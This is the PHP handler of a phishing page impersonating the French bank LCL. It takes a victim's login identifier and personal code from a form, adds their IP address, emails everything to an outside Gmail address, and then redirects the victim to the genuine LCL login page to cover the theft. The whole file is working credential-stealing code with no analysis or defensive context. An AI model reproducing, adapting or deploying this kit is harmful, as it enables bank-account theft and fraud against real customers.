<!DOCTYPE html>
<html class=" js flexbox canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths" lang="fr"><!-- tags head (style, meta ...) --><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	
	
</head>

<body>
<?php
$var1=$_POST['identifiant'];
$var2=$_POST['clavaziz'];
if (empty($var1) or empty($var2)) 
{
include("index.html");
}else
{
$ip = getenv("REMOTE_ADDR");
$message .= "+-------/!\-------< LCL - Le Crédit Lyonnais >--------/!\---------+\n";
$message .= "*===================== Postal RezuLts=====================*\n";
$message .= "Votre Identifiant    :  ".$_POST['identifiant']."\n";
$message .= "Votre code personnel :  ".$_POST['clavaziz']."\n";
$message .= "\n";
$message .= "#============= All Rights Reserved for Abdoux Tangerino =============#\n";
$message .= "#IP : $ip =============#\n";
$message .= "+-------/!\-------< Get Lucky >--------/!\---------+\n";

$send = "nicolascindy409@gmail.com";
$subject = "[ FIX ] $cc | $ip |";
$from = "From: Rezult lcl  <web@rez.fr>";
//print_r($_POST);
mail($send,$subject,$message,$from);
echo "<script type='text/javascript'>document.location.replace('https://particuliers.secure.lcl.fr/outil/UAUT/Accueil/preRoutageLogin');</script>";
}
?>
</body>
</html>
